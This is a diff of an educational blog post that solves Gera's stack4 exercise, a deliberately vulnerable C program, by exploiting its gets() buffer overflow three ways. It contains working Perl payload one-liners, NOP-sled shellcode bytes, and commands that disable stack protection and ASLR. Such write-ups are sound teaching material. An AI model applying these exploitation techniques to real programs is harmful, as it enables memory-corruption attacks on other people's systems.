@@ -1,4 +1,76 @@
-<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>Mannthan</title><link href=/static/images/mannthan-32x32.png sizes=32x32 rel=icon type=image/png><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">🏡 Home </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">💾 Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">🔖 Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td></tr></table></div><div class=body><h1>Gera's Warming Up on Stack #4 - Solutions</h1><p><a href=/posts/20130103_geras-wuos-stack3-solutions.html> « </a>📅 published on <code>04/Jan/2013</code><a href=/posts/20130105_geras-wuos-stack5-solutions.html> » </a></p><p>Following is the part 4 in the series of posts I started back in August 2012 with an aim to provide an analysis and possible solutions for the vulnerable programs provided by <a href="http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=researcher&name=Gerardo_Richarte">Gera</a> at his <a href=http://community.corest.com/%7Egera/InsecureProgramming/ >Insecure Programming</a> by example page.</p><p>This post follows the <a href=https://7h3ram.github.io/posts/20130103_geras-wuos-stack3-solutions.html>Gera's Warming Up on Stack #3 - Solutions</a> post and if you have not read it, I request you to please do so. Most of the concepts are very similar and since they have been already talked about, I'll not be reiterating them here.</p><p>Let's get started. Below is the source for the vulnerable <a href=http://community.corest.com/%7Egera/InsecureProgramming/stack4.html>stack4.c</a> program:</p><pre><code class=c>/* stack4.c                                     *
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>Mannthan</title>
+    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
+    <script src="/static/js/highlight.min.js"></script>
+    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/style.md.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
+    <link rel="stylesheet" href="/static/css/github-gist.min.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
+   </head>
+  <body>
+    <style>
+      .collapsible {
+        cursor: pointer;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        width: 100%;
+        border: none;
+        text-align: left;
+        outline: none;
+        cursor: pointer;
+      }
+      .collapsible:after {
+        content: "+";
+        transition: transform .3s ease;
+        display: inline-block;
+        font-weight: bold;
+        float: right;
+      }
+      .expanded::after {
+        content: "-";
+        -ms-transform: rotate(360deg);
+        -webkit-transform: rotate(360deg);
+        transform: rotate(360deg);
+      }
+      .nested {
+        display: none;
+      }
+      .active {
+        display: block;
+      }
+    </style>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
+          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
+          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
+          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1 class="h1 collapsible" onclick="toggle(this);">Gera's Warming Up on Stack #4 - Solutions</h1>
+                  <p class="nested"><a href="/posts/20130103_geras-wuos-stack3-solutions.html"> « </a>📅 published on <code>04/Jan/2013</code><a href="/posts/20130105_geras-wuos-stack5-solutions.html"> » </a></p>
+                <p class="nested">Following is the part 4 in the series of posts I started back in August 2012 with an aim to provide an analysis and possible solutions for the vulnerable programs provided by <a href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=researcher&amp;name=Gerardo_Richarte">Gera</a> at his <a href="http://community.corest.com/%7Egera/InsecureProgramming/">Insecure Programming</a> by example page.</p>
+<p class="nested">This post follows the <a href="https://7h3ram.github.io/posts/20130103_geras-wuos-stack3-solutions.html">Gera's Warming Up on Stack #3 - Solutions</a> post and if you have not read it, I request you to please do so. Most of the concepts are very similar and since they have been already talked about, I'll not be reiterating them here.</p>
+<p class="nested">Let's get started. Below is the source for the vulnerable <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a> program:</p>
+<p class="nested"re><code class="c">/* stack4.c                                     *
  * specially crafted to feed your brain by gera */
 
 int main() {
@@ -11,7 +83,32 @@ int main() {
     if (cookie == 0x000a0d00)
         printf(&quot;you win!\n&quot;);
 }
-</code></pre><p>The above program too accepts user-input through the <code>gets</code> function and then looks for a specific value in a local variable named <code>cookie</code>. If this value is equal to a certain pre-defined constant, <code>printf</code> function is used to show a <code>you win!</code> message to the user. There is no direct means of modifying the content of the <code>cookie</code> variable. The <code>gets</code> function will keep reading from the stdin device until it encounters a newline or EoF character. Since this reading loop fails to honor the size of the destination buffer, a classic buffer overflow vulnerability is introduced in the program. Our aim is to leverage this vulnerability and exploit this program so that it print the <code>you win!</code> message to stdout.</p><p>Here are a few observations that could be made by looking at the source of the program:</p><ol><li>Since it is defined prior to buf, the <code>cookie</code> would be placed at a higher memory address on the program stack, just below the saved registers from the function prologue</li><li>The <code>buf</code> character array would be at an offset of at least 80B from <code>cookie</code></li><li>The <code>gets</code> call would accept unbounded user-input within <code>buf</code> array and hence it provides a mechanism to alter the call stack contents</li></ol><p>Stack layout for <a href=http://community.corest.com/%7Egera/InsecureProgramming/stack4.html>stack4.c</a> is identical to <a href=http://community.corest.com/%7Egera/InsecureProgramming/stack1.html>stack1.c</a> as already outlined in the <a href=https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html>Gera's Warming Up on Stack #1 - Solutions</a> post.</p><p>Here are solutions I could think of to get the <code>you win!</code> message printed:</p><ul><li>Solution #1: Overflow the internal buf array to overwrite EIP with the address of <code>printf(you win!)</code></li><li>Solution #2: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode and overwrite EIP with its address</li><li>Solution #3: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode through an environment var and overwrite EIP with its address</li></ul><p>Unlike earlier programs, where Solution #1 suggested overflowing the character array to overwrite <code>cookie</code> with desired value, <a href=http://community.corest.com/%7Egera/InsecureProgramming/stack4.html>stack4.c</a> coud not be exploited in that manner. This is beacuse the <code>cookie</code> has been initialized with 0x000a0d00 and if we inject this string, the newline character (0x0a) will cause the <code>gets</code> internal read to stop processing further characters, thereby breaking our exploit. As such we won't be using this technqiue but rather use alternate methods.</p><p>Here's a brief description of the test system:</p><pre><code># cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
+</code></pre>
+
+<p class="nested">The above program too accepts user-input through the <code>gets</code> function and then looks for a specific value in a local variable named <code>cookie</code>. If this value is equal to a certain pre-defined constant, <code>printf</code> function is used to show a <code>you win!</code> message to the user. There is no direct means of modifying the content of the <code>cookie</code> variable. The <code>gets</code> function will keep reading from the stdin device until it encounters a newline or EoF character. Since this reading loop fails to honor the size of the destination buffer, a classic buffer overflow vulnerability is introduced in the program. Our aim is to leverage this vulnerability and exploit this program so that it print the <code>you win!</code> message to stdout.</p>
+<p class="nested">Here are a few observations that could be made by looking at the source of the program:</p>
+<ol class="nested">
+<li>Since it is defined prior to buf, the <code>cookie</code> would be placed at a
+    higher memory address on the program stack, just below the saved
+    registers from the function prologue</li>
+<li>The <code>buf</code> character array would be at an offset of at least 80B from
+    <code>cookie</code></li>
+<li>The <code>gets</code> call would accept unbounded user-input within <code>buf</code> array
+    and hence it provides a mechanism to alter the call stack contents</li>
+</ol>
+<p class="nested">Stack layout for <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a> is identical to <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a> as already outlined in the <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a> post.</p>
+<p class="nested">Here are solutions I could think of to get the <code>you win!</code> message printed:</p>
+<ul class="nested">
+<li>Solution #1: Overflow the internal buf array to overwrite EIP with
+    the address of <code>printf(you win!)</code></li>
+<li>Solution #2: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode and
+    overwrite EIP with its address</li>
+<li>Solution #3: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode
+    through an environment var and overwrite EIP with its address</li>
+</ul>
+<p class="nested">Unlike earlier programs, where Solution #1 suggested overflowing the character array to overwrite <code>cookie</code> with desired value, <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a> coud not be exploited in that manner. This is beacuse the <code>cookie</code> has been initialized with 0x000a0d00 and if we inject this string, the newline character (0x0a) will cause the <code>gets</code> internal read to stop processing further characters, thereby breaking our exploit. As such we won't be using this technqiue but rather use alternate methods.</p>
+<p class="nested">Here's a brief description of the test system:</p>
+<p class="nested"re><code># cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
 DISTRIB_DESCRIPTION=*Ubuntu 10.04.2 LTS*
 Linux 2.6.38 i686 GNU/Linux
 gcc (Ubuntu 4.4.3-4ubuntu5) 4.4.3
@@ -19,14 +116,26 @@ vendor_id   : GenuineIntel
 model       : 37
 model name  : Intel(R) Core(TM) i3 CPU       M 350  @ 2.27GHz
 flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc up pni monitor ssse3 lahf_l
-</code></pre><h2>Solution #1: Overflow the internal buf array to overwrite EIP with the address of printf(you win!)</h2><p>Here's the GCC commandline to prepare <a href=http://community.corest.com/%7Egera/InsecureProgramming/stack4.html>stack4.c</a> for this solution:</p><pre><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack4 stack4.c
+</code></pre>
+
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #1: Overflow the internal buf array to overwrite EIP with the address of printf(you win!)</h2>
+<p class="nested">Here's the GCC commandline to prepare
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a>
+for this solution:</p>
+<p class="nested"re><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack4 stack4.c
 stack4.c: In function ‘main’:
 stack4.c:9: warning: incompatible implicit declaration of built-in function ‘printf’
 stack4.c:9: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 2 has type ‘char (*)[80]’
 stack4.c:9: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 3 has type ‘int *’
 /tmp/ccxoPw3D.o: In function `main':
 stack4.c:(.text+0x27): warning: the `gets' function is dangerous and should not be used.
-</code></pre><p>We need to have a look at the assembly of <a href=http://community.corest.com/%7Egera/InsecureProgramming/stack4.html>stack4.c</a> and find out the location of the <code>printf</code> function which displays the <code>you win!</code> message:</p><pre><code class=c-objdump># objdump -d -M intel stack4 | grep -A20 main.:
+</code></pre>
+
+<p class="nested">We need to have a look at the assembly of
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a>
+and find out the location of the <code>printf</code> function which displays the
+<code>you win!</code> message:</p>
+<p class="nested"re><code class="c-objdump"># objdump -d -M intel stack4 | grep -A20 main.:
 08048444 &lt;main&gt;:
  8048444:   55                      push   ebp
  8048445:   89 e5                   mov    ebp,esp
@@ -48,16 +157,26 @@ stack4.c:(.text+0x27): warning: the `gets' function is dangerous and should not 
  8048485:   c9                      leave
  8048486:   c3                      ret
  8048487:   90                      nop
-</code></pre><p>The address turns out to be 0x8048479. Let's try exploiting:</p><pre><code># perl -e 'print &quot;A&quot;x88 . &quot;\x79\x84\x04\x08&quot;' | ./stack4
+</code></pre>
+
+<p class="nested">The address turns out to be 0x8048479. Let's try exploiting:</p>
+<p class="nested"re><code># perl -e 'print &quot;A&quot;x88 . &quot;\x79\x84\x04\x08&quot;' | ./stack4
 buf: bfee4144 cookie: bfee4194
 you win!
 Segmentation fault
-</code></pre><h2>Solution #2: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode and overwrite EIP with its address</h2><p>Let's first recompile <a href=http://community.corest.com/%7Egera/InsecureProgramming/stack4.html>stack4.c</a> and request GCC to mark program stack as executable. Additionally, we also need to turn ASLR off so that we can have a static return address to overwrite EIP with:</p><pre><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack4 stack4.c 2&gt;/dev/null ; readelf -l stack4 | grep GNU_STACK
+</code></pre>
+
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #2: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode and overwrite EIP with its address</h2>
+<p class="nested">Let's first recompile <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a> and request GCC to mark program stack as executable. Additionally, we also need to turn ASLR off so that we can have a static return address to overwrite EIP with:</p>
+<p class="nested"re><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack4 stack4.c 2&gt;/dev/null ; readelf -l stack4 | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 #
 # echo 0 &gt;/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space
 0
-</code></pre><p>Let's go ahead with exploitation. The Null-free, NOP-prefixed <code>printf(you win!)</code> shellcode we used to exploit <a href=http://community.corest.com/%7Egera/InsecureProgramming/stack1.html>stack1.c</a> in the <a href=https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html>Gera's Warming Up on Stack #1 - Solutions</a> post could be reused here:</p><pre><code># ./stack4
+</code></pre>
+
+<p class="nested">Let's go ahead with exploitation. The Null-free, NOP-prefixed <code>printf(you win!)</code> shellcode we used to exploit <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a> in the <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a> post could be reused here:</p>
+<p class="nested"re><code># ./stack4
 buf: bffff4c4 cookie: bffff514
 #
 # ./stack4
@@ -69,7 +188,11 @@ buf: bffff4c4 cookie: bffff514
 # perl -e 'print &quot;\x90&quot;x51 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21&quot; . &quot;\xc4\xf4\xff\xbf&quot;' | ./stack4
 buf: bffff4c4 cookie: bffff514
 you win!#
-</code></pre><h2>Solution #3: Inject a NOP-prefixed printf(you win!) shellcode through an environment var overwrite EIP with its address</h2><p>Lets get straight to the exploitation:</p><pre><code># echo $WINCODE | hexdump -C
+</code></pre>
+
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #3: Inject a NOP-prefixed printf(you win!) shellcode through an environment var overwrite EIP with its address</h2>
+<p class="nested">Lets get straight to the exploitation:</p>
+<p class="nested"re><code># echo $WINCODE | hexdump -C
 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
 00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
 00000020  20 77 69 6e 21 20 0d 0a                           | win! ..|
@@ -81,4 +204,41 @@ you win!#
 # perl -e 'print &quot;\x90&quot;x88 . &quot;\x26\xf7\xff\xbf&quot;' | ./stack4
 buf: bffff4c4 cookie: bffff514
 you win!
-</code></pre><p>So, we have now successfully exploited the <a href=http://community.corest.com/%7Egera/InsecureProgramming/stack4.html>stack4.c</a> program through three different techniques. Depending on the motive of your exploitation attempt, other techniques could be devised and some, mentioned here, be rejected.</p><p>Like I said, earlier, these solutions are not practical anymore. They just serve the purpose of understanding how exploits used to work before mitigation features were introduced in modern systems. But, as with everything else, understanding basics is really important. As mitigation features mature, exploitation techniques become increasingly complex. And to understand those, we need to build upon the solid foundation of basic concepts, like those discussed on this and other blogs.</p><p style=text-align:center;>(🔖 tagged <a href=/tags.html#ctf>ctf</a> and <a href=/tags.html#exploit>exploit</a>)</p><p style=text-align:center;>« <a href=/posts/20130103_geras-wuos-stack3-solutions.html>Gera's Warming Up on Stack #3 ...</a> « | » <a href=/posts/20130105_geras-wuos-stack5-solutions.html>Gera's Warming Up on Stack #5 ...</a> »</p></div><div class=footer><p style=text-align:center;><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script></body></html>
+</code></pre>
+
+<p class="nested">So, we have now successfully exploited the <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a> program through three different techniques. Depending on the motive of your exploitation attempt, other techniques could be devised and some, mentioned here, be rejected.</p>
+<p class="nested">Like I said, earlier, these solutions are not practical anymore. They just serve the purpose of understanding how exploits used to work before mitigation features were introduced in modern systems. But, as with everything else, understanding basics is really important. As mitigation features mature, exploitation techniques become increasingly complex. And to understand those, we need to build upon the solid foundation of basic concepts, like those discussed on this and other blogs.</p>
+        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#ctf>ctf</a> and <a href=/tags.html#exploit>exploit</a>)</p>
+                  <p class="nested" style="text-align:center;">« <a href="/posts/20130103_geras-wuos-stack3-solutions.html">Gera's Warming Up on Stack #3 ...</a> « | » <a href="/posts/20130105_geras-wuos-stack5-solutions.html">Gera's Warming Up on Stack #5 ...</a> »</p>
+            </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+    <script>
+      function toggle(elem) {
+        elem.classList.toggle("expanded");
+
+        var ish2 = false; var ish3 = false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
+        console.log(elem); console.log(ish2); console.log(ish3);
+
+        var sibling = elem.nextElementSibling;
+        while (sibling) {
+          if (ish2 && sibling.classList.contains("h2")) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (sibling.classList.contains("collapsible")) {
+            sibling.classList.toggle("expanded");
+          }
+          sibling.classList.toggle("active");
+          sibling = sibling.nextElementSibling;
+        }
+      }
+    </script>
+    <div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div>
+  </body>
+</html>
